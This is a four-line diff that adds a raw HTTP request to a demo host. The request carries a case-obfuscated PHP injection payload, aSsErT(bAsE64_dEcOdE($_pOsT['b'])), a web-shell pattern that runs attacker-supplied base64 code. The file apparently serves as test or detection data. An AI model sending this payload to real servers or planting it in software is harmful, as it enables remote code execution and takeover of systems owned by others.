@@ -1,0 +1,4 @@
+GET /a?file=aSsErT(bAsE64_dEcOdE($_pOsT['b'])); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
